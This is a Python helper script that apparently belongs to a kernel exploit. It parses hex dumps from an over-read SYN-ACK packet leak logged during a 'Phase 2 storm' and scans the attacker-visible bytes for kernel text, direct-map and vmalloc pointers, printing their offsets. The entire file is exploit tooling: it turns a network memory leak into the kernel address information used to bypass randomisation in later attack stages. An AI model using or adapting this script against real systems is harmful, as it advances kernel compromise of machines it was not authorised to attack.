#!/usr/bin/env python3
"""leak_parse.py - parse [LEAK] hex dumps from the Phase 2 storm.

The over-read SYN-ACK's IP options start at packet offset 20.  Scan the
attacker-visible bytes for canonical kernel pointers (text/direct-map/vmalloc)
and print offsets.
"""
import re
import sys

KERNEL_RANGES = (
    (0xFFFF800000000000, 0xFFFFC87FFFFFFFFF, "direct-map"),
    (0xFFFFC90000000000, 0xFFFFE8FFFFFFFFFF, "vmalloc"),
    (0xFFFFFFFF80000000, 0xFFFFFFFFFFFFFFFF, "text"),
)


def kind(v):
    for lo, hi, name in KERNEL_RANGES:
        if lo <= v <= hi:
            return name
    return None


def main(path):
    n = 0
    for line in open(path, errors="replace"):
        if "[LEAK]" not in line:
            continue
        m = re.search(r"\[LEAK\]\s+n=(\d+)\s+([0-9a-fA-F]+)", line)
        if not m:
            continue
        n += 1
        ln = int(m.group(1))
        b = bytes.fromhex(m.group(2))
        print(f"--- leak #{n} n={ln} bytes={len(b)}")
        # print first 64 bytes around the IP-options copy area
        for off in range(0, min(len(b), 240), 16):
            chunk = b[off:off + 16]
            print(f"  {off:03x}: {chunk.hex(' ')}")
        # 8-byte little-endian pointer scan from offset 20 onward
        hits = []
        for off in range(20, len(b) - 7, 8):
            v = int.from_bytes(b[off:off + 8], "little")
            k = kind(v)
            if k:
                hits.append((off, v, k))
        for off, v, k in hits:
            print(f"  PTR @+{off:#x} {v:#018x} ({k})")
        if not hits:
            print("  (no canonical kernel pointers)")
    if n == 0:
        print("no [LEAK] lines")


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "/tmp/phase2-storm.log")
